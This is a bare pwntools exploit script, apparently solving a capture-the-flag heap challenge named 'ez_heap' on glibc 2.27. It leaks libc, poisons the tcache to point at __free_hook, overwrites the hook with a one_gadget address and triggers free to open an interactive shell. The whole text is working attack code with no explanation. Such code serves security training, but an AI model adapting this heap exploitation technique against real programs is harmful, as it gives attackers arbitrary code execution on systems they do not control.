from pwn import *
p = process("./ez_heap")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF("./ez_heap")

def alloc():
    p.sendlineafter("quit!\n","1")

def free():
    p.sendlineafter("quit!\n","2")

def change(payload):
    p.sendlineafter("quit!\n","3")
    p.sendafter("something.\n",payload)

def debug():
    gdb.attach(p,"b *{b1}".format(b1=hex(code_base+0x000000000000121B)))

code_base = 0x555555554000
context.log_level = "debug"
debug()
p.recvuntil("this: ")
system_addr = int(p.recv(18),16)
libc.address = system_addr - libc.symbols["system"]
log.success("libc_base:"+hex(libc.address))
__free_hook = libc.symbols["__free_hook"]
strtoul_got = elf.got["strtoul"]
one_gadget = libc.address + 0x4f322
alloc()
free()
change(p64(__free_hook))
alloc()
alloc()
change(p64(one_gadget))
free()
p.interactive()

